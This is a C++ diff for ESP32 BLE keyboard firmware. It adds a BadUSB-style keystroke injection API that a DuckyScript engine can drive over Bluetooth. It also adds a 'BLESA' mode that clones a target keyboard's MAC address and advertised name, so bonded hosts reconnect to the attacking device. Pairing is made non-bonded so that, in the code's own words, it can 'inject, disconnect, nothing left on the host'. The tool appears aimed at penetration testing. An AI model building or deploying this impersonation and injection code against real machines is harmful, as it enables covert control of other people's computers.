@@ -168,6 +168,57 @@ void BleKeyboard::sendKey(char k) {
     _inputKbd->notify(release, sizeof(release));
 }
 
+// ── BadUSB-over-BLE keystroke API ─────────────────────────────────────────────
+// Mirrors USBHIDKeyboard's press/releaseAll/print model but over BLE HID, so the
+// shared DuckyScript engine (BadUsb) drives BLE through BleHidSink identically.
+void BleKeyboard::kbdNotify() {
+    if (_inputKbd) _inputKbd->notify(_rpt, sizeof(_rpt));
+}
+
+void BleKeyboard::kbdReleaseAll() {
+    memset(_rpt, 0, sizeof(_rpt));
+    kbdNotify();
+    vTaskDelay(pdMS_TO_TICKS(5));
+}
+
+void BleKeyboard::kbdHoldUsage(uint8_t mod, uint8_t kc) {
+    _rpt[0] |= mod;
+    if (kc) {
+        for (int i = 2; i < 8; i++) {           // first free slot; skip if already held
+            if (_rpt[i] == kc) break;
+            if (_rpt[i] == 0)  { _rpt[i] = kc; break; }
+        }
+    }
+    kbdNotify();
+    vTaskDelay(pdMS_TO_TICKS(5));
+}
+
+void BleKeyboard::kbdHoldChar(char c) {
+    uint8_t mod = 0, kc = 0;
+    if (asciiToHid((uint8_t)c, mod, kc)) kbdHoldUsage(mod, kc);
+}
+
+// Standalone press+release of one printable char (used by STRING typing) — does NOT
+// disturb any held combo state in _rpt.
+void BleKeyboard::kbdType(char c) {
+    if (!_inputKbd) return;
+    uint8_t mod = 0, kc = 0;
+    if (!asciiToHid((uint8_t)c, mod, kc)) return;
+    uint8_t press[8]   = { mod, 0, kc, 0, 0, 0, 0, 0 };
+    uint8_t release[8] = { 0,   0,  0, 0, 0, 0, 0, 0 };
+    _inputKbd->notify(press, sizeof(press));
+    vTaskDelay(pdMS_TO_TICKS(5));
+    _inputKbd->notify(release, sizeof(release));
+}
+
+bool BleKeyboard::badusbBegin(const char* cloneMacStr, uint8_t cloneType, const char* cloneName) {
+    memset(_rpt, 0, sizeof(_rpt));
+    beginHid(false, cloneMacStr, cloneType, cloneName);   // no bond; spoof target addr if cloning
+    return true;
+}
+void BleKeyboard::badusbEnd()       { endHid(); }
+bool BleKeyboard::badusbConnected() { return s_bleConnected; }
+
 // ── sendMouseMove() ───────────────────────────────────────────────────────────
 void BleKeyboard::sendMouseMove(int8_t x, int8_t y) {
     if (!_inputMouse) return;
@@ -457,7 +508,8 @@ void BleKeyboard::start() {
 // Shared NimBLE HID init + teardown used by both start() (kbd+mouse) and jiggle()
 // (mouse-only). The HID report map carries BOTH keyboard (ID 1) and mouse (ID 2)
 // reports; the jiggler simply only ever sends mouse reports.
-void BleKeyboard::beginHid() {
+void BleKeyboard::beginHid(bool bond, const char* cloneMacStr, uint8_t cloneType,
+                           const char* cloneName) {
     s_bleConnected = false;
     s_connHandle   = BLE_HS_CONN_HANDLE_NONE;
     s_bleExiting   = false;
@@ -477,7 +529,15 @@ void BleKeyboard::beginHid() {
     // Stable unique address for btkbd (suffix CB) — different from buddy (BD) so
     // Windows stores two separate bonds and never confuses keyboard with NUS client.
     // Must be called after init() — ble_hs_id_set_rnd needs the host running.
-    {
+    if (cloneMacStr && *cloneMacStr) {
+        // Phase-2 BLESA MAC-clone: become the target's identity address so a host bonded
+        // to it auto-reconnects to us. Public spoofing is often refused by the controller;
+        // random-static (the common BLE-keyboard case) works.
+        uint8_t at = (cloneType == 0) ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
+        NimBLEDevice::setOwnAddr(NimBLEAddress(cloneMacStr, at));
+        NimBLEDevice::setOwnAddrType(at == BLE_ADDR_PUBLIC ? BLE_OWN_ADDR_PUBLIC
+                                                           : BLE_OWN_ADDR_RANDOM);
+    } else {
         uint8_t hwmac[6];
         esp_read_mac(hwmac, ESP_MAC_BT);
         char macStr[18];
@@ -486,8 +546,12 @@ void BleKeyboard::beginHid() {
         NimBLEDevice::setOwnAddr(NimBLEAddress(macStr, BLE_ADDR_RANDOM));  // register first
         NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);                // succeeds now address exists
     }
-    // Just Works — no PIN dialog, link is encrypted after pairing
-    NimBLEDevice::setSecurityAuth(true, false, false);
+    // Just Works — no PIN dialog, link is encrypted after pairing. bond=true stores a
+    // long-term key (btkbd: a persistent keyboard). bond=false = transient encryption,
+    // NO stored bond — for BadBLE (`ux ble`): fast connect, inject, disconnect, nothing
+    // left on the host + sidesteps the Windows stale-LTK re-pair dance. HID-over-GATT
+    // still needs the link encrypted, so we keep Just Works (can't go fully plaintext).
+    NimBLEDevice::setSecurityAuth(bond, false, false);
     NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
 
     NimBLEServer* server = NimBLEDevice::createServer();
@@ -513,7 +577,7 @@ void BleKeyboard::beginHid() {
     // shows up in Ubuntu settings. Put the name in the scan response (same
     // pattern as buddy.cpp).
     adv->enableScanResponse(true);
-    adv->setName("T-REX-KBD");
+    adv->setName((cloneName && *cloneName) ? cloneName : "T-REX-KBD");  // mimic target's name when cloning
     NimBLEDevice::startAdvertising();
 }
 
